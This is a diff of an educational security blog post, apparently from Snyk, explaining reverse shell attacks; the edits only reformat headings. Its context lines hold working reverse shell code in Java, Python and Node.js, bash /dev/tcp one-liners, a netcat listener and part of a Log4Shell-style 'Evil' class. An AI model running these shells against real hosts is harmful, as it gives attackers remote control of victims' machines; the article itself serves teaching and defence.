@@ -27,15 +27,13 @@ In this article, I'll explain how this can happen with a remote shell attack.
 
 Note: The code examples in this article are for educational purposes only. I mainly try to explain what a remote shell attack is and how it can occur in your applications. Using this or any other example to hack someone is not advised. In most countries, hacking without the consent of the target is illegal, even if you have the best intentions.
 
-What is a reverse shell?
-------------------------
+## What is a reverse shell?
 
 A reverse shell (or connect-back shell) is a shell session initiated by the target machine to a remote host. The target machine opens the session to a specific host and port. A shell connection can be created if the remote host listens on that port with the appropriate software. It's important to note that the initiation is done by the target machine,not the remote host.
 
 With a remote shell attack, an attacker tries to make the victim machine initiate such a connection. The attack can establish interactive shell access (basically a terminal) and take over the victim machine.
 
-How does a reverse shell attack happen?
----------------------------------------
+## How does a reverse shell attack happen?
 
 In most cases, a reverse shell attack happens when an application is vulnerable to a remote code execution vulnerability. An attacker uses such a [vulnerability](https://snyk.io/learn/security-vulnerability-exploits-threats/) in an application to execute some code on the victim's machine that initiates the shell session.
 
@@ -43,8 +41,7 @@ Without knowing it, the victim creates a connection and the attacker only has to
 
 Think of it like a tennis ball. If you throw it at something hard, it will come back at you. You only need to catch it at the right place and time.
 
-Making a reverse shell connection
----------------------------------
+## Making a reverse shell connection
 
 To create a reverse shell, you have multiple options depending on your language. However, before executing this reverse shell code, we need to make sure that we listen to the correct port for incoming connections.
 
@@ -54,8 +51,7 @@ A great tool to do this is netcat. Netcat (often abbreviated to nc) is a compute
 
 `nc -lvp 9001`
 
-Execute a reverse shell in Python, Java or Node.js
---------------------------------------------------
+## Execute a reverse shell in Python, Java or Node.js
 
 Let's discuss two approaches to setting up a reverse shell. Both examples are suitable for systems that have the bash shell installed.
 
@@ -88,7 +84,6 @@ public static void main(String[] args) throws IOException {
 }
 ```
 
-
 In this Java example, we route the process's `InputStream` and `ErrorStream` to the `OutputStream` of the remote socket connection. We also need to do this the other way around and write the `Socket OutputStream` into the `Inputstream` of the bash process.
 
 Python:
@@ -101,7 +96,6 @@ s.connect(("127.0.0.1",9001));
 [os.dup2(s.fileno(),fd) for fd in (0,1,2)];
 pty.spawn("bash");
 ```
-
 
 In this Python script, we connect the stdin, stdout and stderr to the socket connection. In Unix-like systems these are the first three file descriptors. Next we use pty to run `bash`.
 
@@ -118,7 +112,6 @@ client.connect(9001, "127.0.0.1", function(){
    sh.stderr.pipe(client);
 });
 ```
-
 
 This Node.js example is very similar to the Python example. We run `bash` and connect the standard file descriptors appropriately to the socket connection.
 
@@ -145,7 +138,6 @@ public static void main(String[] args) throws IOException {
 }
 ```
 
-
 Python:
 
 ```java
@@ -154,13 +146,11 @@ import os;
 os.system('bash -c "bash -i 5<> /dev/tcp/127.0.0.1/9001 0<&5 1>&5 2>&5"')
 ```
 
-
 Node.js
 
 ```java
 require('child_process').exec('bash -c "bash -i 5<> /dev/tcp/127.0.0.1/9001 0<&5 1>&5 2>&5"')
 ```
-
 
 When you first execute the netcat command listening to port 9001, before executing this piece of code, you will notice that the connection is established and you can execute shell commands like the one below.
 
@@ -168,8 +158,7 @@ When you first execute the netcat command listening to port 9001, before executi
 
 You make a reverse shell connection to yourself with all of the above examples. If you want to do this to a remote machine, you obviously need to change the IP address appropriately. Next, remember that even if you have access, the privilege depends on the user running this code on the victim's machine. To get elevated privileges, you might need to do a bit more.
 
-Creating a reverse shell attack using a remote code execution vulnerability
----------------------------------------------------------------------------
+## Creating a reverse shell attack using a remote code execution vulnerability
 
 To create an actual attack with code examples like this, we need to leverage a code execution vulnerability and insert the code into an existing system.
 
@@ -193,13 +182,11 @@ public class Evil implements ObjectFactory {
 }
 ```
 
-
 Almost all remote code executions can be used to enable a reverse shell attack. Other recent examples were \[Spring4Shell\](<https://snyk.io/blog/spring4shell-zero-day-rce-spring>- framework-explained/) and the \[Apache Commons Configuration RCE\](<https://snyk.io/blog/cve-2022-33980-apache-commons-configuration-rce>- vulnerability/).
 
 Both examples were not as problematic as Log4Shell, but you can use either to create a reverse shell attack and possibly control a target machine. Therefore, it's essential to prevent that user input from (partially) being executed.
 
-How to prevent reverse shell attacks
-------------------------------------
+## How to prevent reverse shell attacks
 
 If we can prevent an attacker from executing code on your machine, we eliminate almost all possibilities of a reverse shell attack. Let's look at some measures you can take to prevent malicious reverse shell attacks as a developer.
 
@@ -210,8 +197,7 @@ If we can prevent an attacker from executing code on your machine, we eliminate 
 
 Almost all remote code executions can be used for a reverse shell attack, even if the use case looks far-fetched.
 
-Snyk can help!
---------------
+## Snyk can help!
 
 Snyk is a helpful tool for preventing reverse shell attacks by scanning code and dependencies.
 
